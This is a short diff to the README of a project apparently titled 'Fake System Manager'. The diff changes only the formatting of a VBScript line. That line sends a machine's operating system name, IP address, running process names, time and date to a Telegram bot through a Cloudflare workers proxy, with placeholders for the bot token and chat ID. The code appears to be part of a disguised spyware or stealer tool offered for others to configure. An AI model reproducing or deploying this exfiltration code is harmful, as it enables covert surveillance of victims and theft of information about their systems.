@@ -6,5 +6,4 @@ Fake System Manager
 ## Change
 <pre>Token Bot Telegram & Chat ID</pre>
 ```VBS
-http.Open "GET", "https://telegram.mrsaad.workers.dev/bot{TOKEN}/sendMessage?chat_id={ID}&text=" & os.Caption & " - " & ip.IPAddress(0) & " : " & objProcess.Name & " - " & Time & " - " & Date, False
-```
+http.Open "GET", "https://telegram.mrsaad.workers.dev/bot{TOKEN}/sendMessage?chat_id={ID}&text=" & os.Caption & " - " & ip.IPAddress(0) & " : " & objProcess.Name & " - " & Time & " - " & Date, False```
